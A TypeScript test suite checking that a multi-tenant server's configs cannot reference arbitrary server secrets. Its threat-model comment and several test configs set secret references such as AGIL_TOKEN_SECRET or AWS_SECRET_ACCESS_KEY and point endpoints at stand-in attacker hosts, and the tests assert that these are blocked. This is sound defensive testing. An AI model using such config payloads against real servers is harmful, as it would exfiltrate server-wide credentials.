/**
 * P1 hardening: tenant-config secret references may only name server-owned env
 * namespaces (`AGIL_INTEGRATION_*`, `AGIL_WEBHOOK_*`, `AGIL_SIEM_*`,
 * `AGIL_SFU_*`, `AGIL_TURN_*`), are snapshotted at startup, and are validated
 * both when the config is written and when the secret is used.
 *
 * Threat model: a tenant admin (or an SSO admin session) writes
 * `session.aiAgent.apiKeyEnv = "AGIL_TOKEN_SECRET"` and
 * `endpoint = "https://attacker.example"`, turning the server into a
 * `process.env` reader that ships server-wide secrets to them.
 */
import { after, before, test } from 'node:test';
import assert from 'node:assert/strict';
import { createHmac } from 'node:crypto';
import { createServer, type Server } from 'node:http';
import type { AddressInfo } from 'node:net';
import { resolveTenantSecret } from '../src/secret-env.js';
import { parseOidcClientSecrets, parseOidcTenantSecrets } from '../src/env.js';
import { startTestServer, type TestServer } from './helpers.js';

const ADMIN = { 'x-api-key': 'dev-key' };
const ACME = { 'x-api-key': 'acme-key' };
/** Value of a real server secret that a tenant config must never resolve. */
const CANARY = 'server-only-token-secret-value';
const KEYS = {
  kb: 'kb-key-value',
  provider: 'provider-key-value',
  webhook: 'webhook-secret-value',
};

let ts: TestServer;
let receiver: Server;
let receiverUrl = '';
const requests: Array<{ url: string; headers: Record<string, string | string[] | undefined>; body: string }> = [];
const savedTokenSecret = process.env.AGIL_TOKEN_SECRET;

function receiverRequestsSince(mark: number): typeof requests {
  return requests.slice(mark);
}

function receiverCalls(): number {
  return requests.length;
}

async function startReceiver(): Promise<void> {
  receiver = createServer((req, res) => {
    const chunks: Buffer[] = [];
    req.on('data', (chunk: Buffer) => chunks.push(chunk));
    req.on('end', () => {
      const body = Buffer.concat(chunks).toString('utf8');
      const url = req.url ?? '/';
      requests.push({ url, headers: req.headers, body });
      if (url.startsWith('/kb')) {
        let requestId = 'unknown';
        try {
          requestId = JSON.parse(body).requestId;
        } catch {
          /* ignore */
        }
        res.setHeader('content-type', 'application/json');
        res.end(JSON.stringify({ requestId, answer: 'ok', citations: [], confidence: 0.9, provider: 'test-kb' }));
        return;
      }
      if (url.startsWith('/provider')) {
        res.setHeader('content-type', 'application/json');
        res.end(JSON.stringify({ ok: true, data: {} }));
        return;
      }
      res.statusCode = 200;
      res.end('ok');
    });
  });
  await new Promise<void>((resolve) => receiver.listen(0, '127.0.0.1', resolve));
  receiverUrl = `http://127.0.0.1:${(receiver.address() as AddressInfo).port}`;
}

function webhookEndpoint(secretEnv: string, id = 'hook-secret-env') {
  return {
    id,
    url: `${receiverUrl}/hook`,
    events: ['security.event'],
    secretEnv,
    enabled: true,
    retries: 0,
    timeoutMs: 1000,
  };
}

function providerSlot(apiKeyEnv: string) {
  return {
    mode: 'external',
    providerName: 'attacker',
    endpoint: `${receiverUrl}/provider`,
    apiKeyEnv,
    timeoutMs: 1000,
    fallback: 'builtin',
    options: {},
  };
}

before(async () => {
  // Snapshot is taken at startup: allowlisted names must be provided here.
  ts = await startTestServer({
    tenantSecretEnv: {
      AGIL_INTEGRATION_TEST_KB_KEY: KEYS.kb,
      AGIL_INTEGRATION_TEST_PROVIDER_KEY: KEYS.provider,
      AGIL_WEBHOOK_TEST_SECRET: KEYS.webhook,
    },
  });
  // A real server-wide secret that exists in the process environment. Before
  // the hardening `process.env[name]` resolved it for any tenant config; now it
  // must be invisible (snapshot namespace + use-time allowlist).
  process.env.AGIL_TOKEN_SECRET = CANARY;
  await startReceiver();
});

after(async () => {
  if (savedTokenSecret === undefined) delete process.env.AGIL_TOKEN_SECRET;
  else process.env.AGIL_TOKEN_SECRET = savedTokenSecret;
  delete process.env.AGIL_INTEGRATION_LATE_SECRET;
  await ts.close();
  await new Promise<void>((resolve) => receiver.close(() => resolve()));
});

test('OIDC tenant secret map and namespace snapshot are parsed fail-closed', () => {
  assert.deepEqual(parseOidcTenantSecrets('demo=AGIL_OIDC_CLIENT_SECRET, acme=AGIL_OIDC_CLIENT_SECRET_ACME_B'), {
    demo: 'AGIL_OIDC_CLIENT_SECRET',
    acme: 'AGIL_OIDC_CLIENT_SECRET_ACME_B',
  });
  // Tenant keys are exact and case-sensitive (TenantStore policy): no
  // lower-casing, so `demo` and `DEMO` stay distinct and separator ids survive.
  assert.deepEqual(
    parseOidcTenantSecrets(
      'demo=AGIL_OIDC_CLIENT_SECRET_DEMO_A,DEMO=AGIL_OIDC_CLIENT_SECRET_DEMO_B,' +
        'a-b=AGIL_OIDC_CLIENT_SECRET_DASH,a_b=AGIL_OIDC_CLIENT_SECRET_UNDERSCORE,a.b=AGIL_OIDC_CLIENT_SECRET_DOT',
    ),
    {
      demo: 'AGIL_OIDC_CLIENT_SECRET_DEMO_A',
      DEMO: 'AGIL_OIDC_CLIENT_SECRET_DEMO_B',
      'a-b': 'AGIL_OIDC_CLIENT_SECRET_DASH',
      a_b: 'AGIL_OIDC_CLIENT_SECRET_UNDERSCORE',
      'a.b': 'AGIL_OIDC_CLIENT_SECRET_DOT',
    },
  );
  // Names outside AGIL_OIDC_CLIENT_SECRET[_*] and malformed pairs are ignored.
  assert.deepEqual(parseOidcTenantSecrets('demo=AGIL_TOKEN_SECRET'), {});
  assert.deepEqual(parseOidcTenantSecrets('demo=AGIL_OIDC_CLIENT_SECRET_'), {});
  assert.deepEqual(parseOidcTenantSecrets('demo'), {});
  assert.deepEqual(parseOidcTenantSecrets(''), {});
  // One env name cannot be shared by two tenants; the ambiguous entry is dropped.
  assert.deepEqual(
    parseOidcTenantSecrets('demo=AGIL_OIDC_CLIENT_SECRET_SHARED,acme=AGIL_OIDC_CLIENT_SECRET_SHARED'),
    {},
  );
  // A duplicate tenant key is ambiguous: the whole map is ignored (fail closed)
  // instead of the last entry silently winning.
  assert.deepEqual(
    parseOidcTenantSecrets('demo=AGIL_OIDC_CLIENT_SECRET_A,demo=AGIL_OIDC_CLIENT_SECRET_B'),
    {},
  );
  assert.deepEqual(
    parseOidcTenantSecrets('a-b=AGIL_OIDC_CLIENT_SECRET_A,a-b=AGIL_OIDC_CLIENT_SECRET_B,acme=AGIL_OIDC_CLIENT_SECRET_C'),
    {},
  );
  // The namespace snapshot never includes the map variable or arbitrary secrets.
  const snapshot = parseOidcClientSecrets({
    AGIL_OIDC_CLIENT_SECRET_DEMO_A: 'demo-a',
    AGIL_OIDC_TENANT_SECRETS: 'demo=AGIL_OIDC_CLIENT_SECRET_DEMO_A',
    AGIL_TOKEN_SECRET: 'server-only',
  } as NodeJS.ProcessEnv);
  assert.deepEqual(snapshot, { AGIL_OIDC_CLIENT_SECRET_DEMO_A: 'demo-a' });
});

test('resolver reads only the startup snapshot, never process.env', () => {
  const env = { tenantSecretEnv: { AGIL_INTEGRATION_OK: 'from-snapshot' } };
  const ok = resolveTenantSecret(env, 'AGIL_INTEGRATION_OK', 'integration');
  assert.equal(ok.allowed, true);
  assert.equal(ok.value, 'from-snapshot');

  const arbitrary = resolveTenantSecret(env, 'AGIL_TOKEN_SECRET', 'integration');
  assert.equal(arbitrary.allowed, false);
  assert.equal(arbitrary.value, undefined);

  // The value exists in process.env, but the resolver never consults it.
  assert.equal(process.env.AGIL_TOKEN_SECRET, CANARY);
  const crossKind = resolveTenantSecret(env, 'AGIL_WEBHOOK_TEST_SECRET', 'integration');
  assert.equal(crossKind.allowed, false);
  assert.equal(crossKind.value, undefined);
});

test('config PATCH rejects arbitrary env names for every secret reference', async () => {
  const cases: Array<{ body: Record<string, unknown>; path: string }> = [
    { body: { session: { aiAgent: { apiKeyEnv: 'AGIL_TOKEN_SECRET' } } }, path: 'session.aiAgent.apiKeyEnv' },
    { body: { session: { knowledgeAgent: { apiKeyEnv: 'AGIL_TOKEN_SECRET' } } }, path: 'session.knowledgeAgent.apiKeyEnv' },
    { body: { session: { inCallAgent: { apiKeyEnv: 'AGIL_TOKEN_SECRET' } } }, path: 'session.inCallAgent.apiKeyEnv' },
    { body: { providers: { chat: providerSlot('AGIL_PLATFORM_KEY') } }, path: 'providers.chat.apiKeyEnv' },
    { body: { integrations: { webhooks: [webhookEndpoint('AGIL_API_KEYS')] } }, path: 'integrations.webhooks.0.secretEnv' },
    {
      body: {
        integrations: {
          siem: { enabled: true, url: `${receiverUrl}/siem`, format: 'json', secretEnv: 'AGIL_TOKEN_SECRET', events: [], timeoutMs: 1000, retries: 0 },
        },
      },
      path: 'integrations.siem.secretEnv',
    },
    { body: { scale: { sfu: { apiKeyEnv: 'AGIL_API_KEYS' } } }, path: 'scale.sfu.apiKeyEnv' },
    {
      body: { scale: { turn: [{ id: 't1', urls: ['turn:turn.example:3478'], username: 'u', credentialEnv: 'AWS_SECRET_ACCESS_KEY', region: 'ru', weight: 1 }] } },
      path: 'scale.turn.0.credentialEnv',
    },
  ];
  for (const { body, path } of cases) {
    const response = await ts.api('PATCH', '/v1/tenants/demo/config', { headers: ADMIN, body });
    assert.equal(response.status, 400, `${path}: ${JSON.stringify(response.body)}`);
    assert.equal(response.body.error.code, 'validation_failed');
    const details = response.body.error.details as Array<{ path: string }> | undefined;
    assert.ok(details?.some((issue) => issue.path === path), `${path} not in ${JSON.stringify(details)}`);
  }

  // Nothing from the rejected writes was persisted.
  const after = await ts.api('GET', '/v1/tenants/demo/config', { headers: ADMIN });
  assert.equal(after.body.config.session.aiAgent.apiKeyEnv, 'AGIL_AI_AGENT_KEY');
  assert.equal(after.body.config.session.knowledgeAgent.apiKeyEnv, 'AGIL_KNOWLEDGE_AGENT_KEY');
  assert.equal(after.body.config.integrations.webhooks.length, 0);
  assert.equal(after.body.config.integrations.siem.secretEnv, '');
  assert.equal(after.body.config.providers.chat.mode, 'builtin');
});

test('admin config endpoints reject arbitrary env names', async () => {
  const update = await ts.api('PUT', '/v1/admin/ai-agent', {
    headers: ADMIN,
    body: { config: { enabled: true, mode: 'external', endpoint: `${receiverUrl}/ai`, apiKeyEnv: 'AGIL_TOKEN_SECRET' } },
  });
  assert.equal(update.status, 400, JSON.stringify(update.body));
  assert.equal(update.body.error.code, 'validation_failed');

  const knowledge = await ts.api('PUT', '/v1/admin/knowledge-agent', {
    headers: ADMIN,
    body: { config: { enabled: true, endpoint: `${receiverUrl}/kb`, apiKeyEnv: 'AGIL_PLATFORM_KEY' } },
  });
  assert.equal(knowledge.status, 400, JSON.stringify(knowledge.body));

  const inCall = await ts.api('PUT', '/v1/admin/in-call-agent', {
    headers: ADMIN,
    body: { config: { enabled: true, mode: 'external', endpoint: `${receiverUrl}/assistant`, apiKeyEnv: 'AGIL_API_KEYS' } },
  });
  assert.equal(inCall.status, 400, JSON.stringify(inCall.body));

  const providers = await ts.api('PUT', '/v1/admin/providers', {
    headers: ADMIN,
    body: { providers: { chat: providerSlot('AGIL_TOKEN_SECRET') } },
  });
  assert.equal(providers.status, 400, JSON.stringify(providers.body));

  const webhooks = await ts.api('PUT', '/v1/admin/webhooks', {
    headers: ADMIN,
    body: { webhooks: [webhookEndpoint('AGIL_PUBLIC_ORIGIN')] },
  });
  assert.equal(webhooks.status, 400, JSON.stringify(webhooks.body));

  const scale = await ts.api('PUT', '/v1/admin/scale', {
    headers: ADMIN,
    body: { scale: { sfu: { provider: 'livekit', url: 'wss://sfu.example', apiKeyEnv: 'AGIL_TOKEN_SECRET', apiSecretEnv: 'AGIL_SFU_API_SECRET', region: 'ru', maxParticipants: 100 } } },
  });
  assert.equal(scale.status, 400, JSON.stringify(scale.body));

  const turnScale = await ts.api('PUT', '/v1/admin/scale', {
    headers: ADMIN,
    body: { scale: { turn: [{ id: 't-evil', urls: ['turn:turn.example:3478'], username: 'u', credentialEnv: 'AGIL_TOKEN_SECRET', region: 'ru', weight: 1 }] } },
  });
  assert.equal(turnScale.status, 400, JSON.stringify(turnScale.body));

  // No config write reached the receiver or the stored config.
  assert.equal(receiverCalls(), 0);
  const config = await ts.api('GET', '/v1/tenants/demo/config', { headers: ADMIN });
  assert.equal(config.body.config.session.aiAgent.apiKeyEnv, 'AGIL_AI_AGENT_KEY');
  assert.equal(config.body.config.session.inCallAgent.endpoint, '');
  assert.equal(config.body.config.integrations.webhooks.length, 0);
});

test('allowlisted names still work; allowlisted-but-unset names fail closed without leaking', async () => {
  // --- positive controls: the snapshot value is used -----------------------
  const kbSaved = await ts.api('PUT', '/v1/admin/knowledge-agent', {
    headers: ADMIN,
    body: { config: { enabled: true, endpoint: `${receiverUrl}/kb`, apiKeyEnv: 'AGIL_INTEGRATION_TEST_KB_KEY', allowedRoles: ['host'], requirePermission: false, citations: true, timeoutMs: 2000 } },
  });
  assert.equal(kbSaved.status, 200, JSON.stringify(kbSaved.body));
  assert.equal(kbSaved.body.apiKeyConfigured, true);
  const answered = await ts.api('POST', '/v1/admin/knowledge/ask', { headers: ADMIN, body: { question: 'q', role: 'host' } });
  assert.equal(answered.status, 200, JSON.stringify(answered.body));
  const kbCall = requests.find((entry) => entry.url.startsWith('/kb'));
  assert.ok(kbCall);
  assert.equal(kbCall.headers.authorization, `Bearer ${KEYS.kb}`);
  assert.ok(!JSON.stringify(kbCall).includes(CANARY));

  const hookSaved = await ts.api('PUT', '/v1/admin/webhooks', {
    headers: ADMIN,
    body: { webhooks: [webhookEndpoint('AGIL_WEBHOOK_TEST_SECRET')] },
  });
  assert.equal(hookSaved.status, 200, JSON.stringify(hookSaved.body));
  const hookTest = await ts.api('POST', '/v1/admin/webhooks/test', { headers: ADMIN, body: { endpointId: 'hook-secret-env' } });
  assert.equal(hookTest.status, 200);
  assert.equal(hookTest.body.status, 'delivered', JSON.stringify(hookTest.body));
  const hookCall = requests.find((entry) => entry.url === '/hook');
  assert.ok(hookCall);
  const timestamp = String(hookCall.headers['x-agil-timestamp'] ?? '');
  const expected = createHmac('sha256', KEYS.webhook).update(`${timestamp}.${hookCall.body}`, 'utf8').digest('hex');
  assert.equal(hookCall.headers['x-agil-signature'], expected);

  const providerSaved = await ts.api('PUT', '/v1/admin/providers', {
    headers: ADMIN,
    body: { providers: { chat: providerSlot('AGIL_INTEGRATION_TEST_PROVIDER_KEY') } },
  });
  assert.equal(providerSaved.status, 200, JSON.stringify(providerSaved.body));
  const providerTest = await ts.api('POST', '/v1/admin/providers/test', { headers: ADMIN, body: { slot: 'chat', payload: { probe: true } } });
  assert.equal(providerTest.status, 200);
  assert.equal(providerTest.body.ok, true, JSON.stringify(providerTest.body));

  // --- allowlisted but not present at startup -> 501/error, no secret ------
  const before = receiverCalls();
  const kbUnset = await ts.api('PUT', '/v1/admin/knowledge-agent', {
    headers: ADMIN,
    body: { config: { enabled: true, endpoint: `${receiverUrl}/kb`, apiKeyEnv: 'AGIL_INTEGRATION_NOT_SET_AT_START' } },
  });
  assert.equal(kbUnset.status, 200, JSON.stringify(kbUnset.body));
  assert.equal(kbUnset.body.apiKeyConfigured, false);
  const kbDenied = await ts.api('POST', '/v1/admin/knowledge/ask', { headers: ADMIN, body: { question: 'q', role: 'host' } });
  assert.equal(kbDenied.status, 501);
  assert.equal(kbDenied.body.error.code, 'knowledge_not_configured');
  assert.match(String(kbDenied.body.error.message), /AGIL_INTEGRATION_NOT_SET_AT_START/);
  assert.ok(!JSON.stringify(kbDenied.body).includes(CANARY));

  const hookUnset = await ts.api('PUT', '/v1/admin/webhooks', {
    headers: ADMIN,
    body: { webhooks: [webhookEndpoint('AGIL_WEBHOOK_NOT_SET_AT_START')] },
  });
  assert.equal(hookUnset.status, 200, JSON.stringify(hookUnset.body));
  const hookDenied = await ts.api('POST', '/v1/admin/webhooks/test', { headers: ADMIN, body: { endpointId: 'hook-secret-env' } });
  assert.equal(hookDenied.status, 200);
  assert.equal(hookDenied.body.status, 'failed');
  assert.match(String(hookDenied.body.error), /AGIL_WEBHOOK_NOT_SET_AT_START/);
  assert.ok(!JSON.stringify(hookDenied.body).includes(CANARY));

  const providerUnset = await ts.api('PUT', '/v1/admin/providers', {
    headers: ADMIN,
    body: { providers: { chat: providerSlot('AGIL_INTEGRATION_NOT_SET_AT_START') } },
  });
  assert.equal(providerUnset.status, 200, JSON.stringify(providerUnset.body));
  const providerDenied = await ts.api('POST', '/v1/admin/providers/test', { headers: ADMIN, body: { slot: 'chat' } });
  assert.equal(providerDenied.status, 200);
  assert.equal(providerDenied.body.ok, false);
  assert.match(String(providerDenied.body.detail), /AGIL_INTEGRATION_NOT_SET_AT_START/);
  assert.ok(!JSON.stringify(providerDenied.body).includes(CANARY));

  assert.equal(receiverCalls(), before, 'unset secrets must not trigger outbound requests');

  // --- snapshot semantics: a variable set *after* startup is invisible ------
  process.env.AGIL_INTEGRATION_LATE_SECRET = 'late-value';
  const late = await ts.api('PUT', '/v1/admin/knowledge-agent', {
    headers: ADMIN,
    body: { config: { enabled: true, endpoint: `${receiverUrl}/kb`, apiKeyEnv: 'AGIL_INTEGRATION_LATE_SECRET' } },
  });
  assert.equal(late.status, 200);
  const lateDenied = await ts.api('POST', '/v1/admin/knowledge/ask', { headers: ADMIN, body: { question: 'q', role: 'host' } });
  assert.equal(lateDenied.status, 501, 'a late env var must not be visible through the snapshot');
  assert.ok(!JSON.stringify(lateDenied.body).includes('late-value'));
  delete process.env.AGIL_INTEGRATION_LATE_SECRET;
});

test('use-time guard: a hand-written config naming a real secret never reads or sends it', async () => {
  // Bypass the write validation on purpose (simulates a config persisted before
  // the hardening, or one edited directly on disk).
  const config = structuredClone(ts.server.tenants.getConfig('acme'));
  config.session.knowledgeAgent = {
    ...config.session.knowledgeAgent,
    enabled: true,
    endpoint: `${receiverUrl}/kb`,
    apiKeyEnv: 'AGIL_TOKEN_SECRET',
  };
  config.session.inCallAgent = {
    ...config.session.inCallAgent,
    enabled: true,
    mode: 'external',
    endpoint: `${receiverUrl}/assistant`,
    apiKeyEnv: 'AGIL_TOKEN_SECRET',
  };
  config.providers.chat = {
    ...config.providers.chat,
    mode: 'external',
    providerName: 'attacker',
    endpoint: `${receiverUrl}/provider`,
    apiKeyEnv: 'AGIL_TOKEN_SECRET',
    fallback: 'fail',
    timeoutMs: 1000,
  } as typeof config.providers.chat;
  config.integrations.webhooks = [webhookEndpoint('AGIL_TOKEN_SECRET', 'hook-legacy')];
  config.scale.sfu = {
    ...config.scale.sfu,
    provider: 'livekit',
    url: 'wss://sfu.attacker.example',
    apiKeyEnv: 'AGIL_TOKEN_SECRET',
    apiSecretEnv: 'AGIL_TOKEN_SECRET',
  };
  config.scale.turn = [
    {
      id: 'turn-evil',
      urls: ['turn:turn.attacker.example:3478'],
      username: 'agil',
      credentialEnv: 'AGIL_TOKEN_SECRET',
      region: 'ru',
      weight: 1,
    },
  ];
  ts.server.tenants.setConfig('acme', config);

  const mark = receiverCalls();

  // Scale status resolves both references from the snapshot only: the canary is
  // never used as an SFU/TURN credential and never leaves the server.
  const scaleStatus = await ts.api('GET', '/v1/admin/scale', { headers: ACME });
  assert.equal(scaleStatus.status, 200);
  assert.equal(scaleStatus.body.sfuConfigured, false);
  const turnStatus = scaleStatus.body.turn.find((server: { id: string }) => server.id === 'turn-evil');
  assert.equal(turnStatus.credentialConfigured, false);
  assert.ok(!JSON.stringify(scaleStatus.body).includes(CANARY));
  assert.equal(receiverCalls(), mark, 'scale status must not contact the attacker endpoint');

  // Knowledge proxy: 501 before any HTTP request.
  const ask = await ts.api('POST', '/v1/admin/knowledge/ask', { headers: ACME, body: { question: 'q', role: 'host' } });
  assert.equal(ask.status, 501, JSON.stringify(ask.body));
  assert.ok(!JSON.stringify(ask.body).includes(CANARY));
  assert.equal(receiverCalls(), mark, 'knowledge proxy must not contact the attacker endpoint');

  // Provider: error, no request.
  const providerTest = await ts.api('POST', '/v1/admin/providers/test', { headers: ACME, body: { slot: 'chat' } });
  assert.equal(providerTest.status, 200);
  assert.equal(providerTest.body.ok, false);
  assert.match(String(providerTest.body.detail), /not allowed/i);
  assert.ok(!JSON.stringify(providerTest.body).includes(CANARY));
  assert.equal(receiverCalls(), mark, 'provider call must not contact the attacker endpoint');

  // Webhook: failed delivery, no request.
  const hookTest = await ts.api('POST', '/v1/admin/webhooks/test', { headers: ACME, body: { endpointId: 'hook-legacy' } });
  assert.equal(hookTest.status, 200);
  assert.equal(hookTest.body.status, 'failed');
  assert.match(String(hookTest.body.error), /not allowed/i);
  assert.ok(!JSON.stringify(hookTest.body).includes(CANARY));
  assert.equal(receiverCalls(), mark, 'webhook delivery must not contact the attacker endpoint');

  // In-call assistant: 502 provider_failed, no request.
  const room = await ts.api('POST', '/v1/admin/rooms', { headers: ACME, body: { name: 'Secret env room' } });
  const roomId = room.body.room.id;
  const token = await ts.api('POST', '/v1/tokens', {
    headers: ACME,
    body: { tenantId: 'acme', roomId, participant: { name: 'Host', role: 'host' } },
  });
  const assistant = await ts.api('POST', `/v1/rooms/${roomId}/assistant`, {
    headers: { authorization: `Bearer ${token.body.token}` },
    body: { text: 'привет' },
  });
  assert.equal(assistant.status, 502, JSON.stringify(assistant.body));
  assert.ok(!JSON.stringify(assistant.body).includes(CANARY));
  assert.equal(receiverCalls(), mark, 'assistant must not contact the attacker endpoint');

  // Belt and braces: no request that did happen carries the secret.
  for (const request of receiverRequestsSince(mark)) {
    assert.ok(!JSON.stringify(request).includes(CANARY));
    assert.equal(request.headers.authorization, undefined);
  }
});

test('SIEM export never signs with a non-allowlisted secret', async () => {
  const config = structuredClone(ts.server.tenants.getConfig('acme'));
  config.integrations.siem = {
    enabled: true,
    url: `${receiverUrl}/siem`,
    format: 'json',
    secretEnv: 'AGIL_TOKEN_SECRET',
    events: [],
    timeoutMs: 1000,
    retries: 0,
  };
  ts.server.tenants.setConfig('acme', config);
  const before = requests.filter((entry) => entry.url === '/siem').length;

  // A room creation emits an audited event; SIEM export is async/fail-open.
  const created = await ts.api('POST', '/v1/admin/rooms', { headers: ACME, body: { name: 'SIEM probe' } });
  assert.equal(created.status, 200, JSON.stringify(created.body));

  let siemCalls = requests.filter((entry) => entry.url === '/siem');
  for (let attempt = 0; attempt < 60 && siemCalls.length === before; attempt += 1) {
    await new Promise((resolve) => setTimeout(resolve, 50));
    siemCalls = requests.filter((entry) => entry.url === '/siem');
  }
  assert.ok(siemCalls.length > before, 'the audit event was exported to the SIEM receiver');
  const call = siemCalls[siemCalls.length - 1];
  assert.ok(call);
  assert.equal(call.headers['x-agil-signature'], undefined, 'no HMAC keyed by a server-wide secret');
  assert.ok(!JSON.stringify(call).includes(CANARY));
});

test('room config overrides cannot smuggle a non-allowlisted secret reference', async () => {
  const response = await ts.api('POST', '/v1/rooms', {
    headers: ADMIN,
    body: { name: 'override room', configOverrides: { session: { aiAgent: { apiKeyEnv: 'AGIL_TOKEN_SECRET' } } } },
  });
  assert.equal(response.status, 400, JSON.stringify(response.body));
  assert.equal(response.body.error.code, 'validation_failed');
});
